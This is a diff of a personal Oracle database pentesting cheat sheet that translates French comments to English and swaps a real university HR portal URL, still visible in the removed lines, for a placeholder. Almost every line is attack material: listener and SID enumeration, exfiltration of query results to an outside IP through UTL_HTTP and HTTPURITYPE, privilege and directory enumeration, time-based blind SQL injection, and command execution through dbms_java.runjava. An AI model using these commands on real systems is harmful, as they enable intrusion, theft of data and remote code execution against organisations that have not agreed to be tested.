@@ -13,18 +13,18 @@ dbms_xmlgen.newcontext()
 http://netinfiltration.com/
 https://github.com/Mekanismen/pwnacle-fusion
 
-# le blog d'un pentester expert en intrusion d'oracle
+# some good articles on pentesting Oracle
 www.notsosecure.com
 
 # RedoWalker dumps Oracle redo logs to an XML format; it specifically dumps redo entries fro DDL, INSERTs, UPDATEs, DELETEs and associated UNDO records.
 http://www.davidlitchfield.com/redowalker.htm
 
-# tester si listener protégé depuis l'extérieur (recup version et SID)
+# testing for unprotected listener
 metasploit: scanner/oracle/tnslsnr_version et scanner/oracle/sid_enum
 tnscmd.pl ou tnscmd10g.pl
 
-# tester localement
-lsnrctl (dans $ORACLE_HOME/bin un truc comme ça)
+# testing locally
+lsnrctl (somewhere under $ORACLE_HOME/bin)
 
 ## audit
 set heading off
@@ -95,12 +95,12 @@ select UTL_HTTP.REQUEST('http://1.2.3.4:53/?q='||(select 123 from dual)) from du
 SELECT HTTPURITYPE('http://1.2.3.4/?q='||(select 123 from dual)).getXML() FROM DUAL; # pas possible de specifier un port different
 select UTL_FILE. FIXME
 
-#fichier
+# fichier
 select value from v$parameter where name = 'utl_file_dir';
 select * from all_directories where rownum=1; # DIRECTORY_NAME, DIRECTORY_PATH
 select * from dba_directories where rownum=1; # DIRECTORY_NAME, DIRECTORY_PATH
 
-#liste des privileges
+# liste des privileges
 select * from session_privs
 select * from user_sys_privs
 select * from user_role_privs
@@ -120,13 +120,12 @@ select count(*) from UNE_TABLE
 select count(*) from all_tab_columns where table_name = 'UNE_TABLE'
 for i in {1..49}; do ./a.py "select column_name from (select ROWNUM R,column_name from all_tab_columns where table_name = 'UNE_TABLE') where R=$i"; done
 
-# time-based blind sqli
-# use heavy queries
+# time-based blind sqli: use heavy queries
 select 1 from dual where (select count(*) from user_objects,user_objects, user_objects)=0;
 
-##
-curl -v 'https://myhr.sydney.edu.au/pls/portal/%0A' -> <set-cookie>
-curl -H 'Cookie: <set-cookie>' https://myhr.sydney.edu.au/dav_portal/portal/
+# pls
+curl -v 'https://blah/pls/portal/%0A' -> <set-cookie>
+curl -H 'Cookie: <set-cookie>' https://blah/dav_portal/portal/
 
 # rce through dbms_java.runjava
 select dbms_java.runjava('com/sun/tools/script/shell/Main -e "var p = java.lang.Runtime.getRuntime().exec(''$cmd'');"') from dual
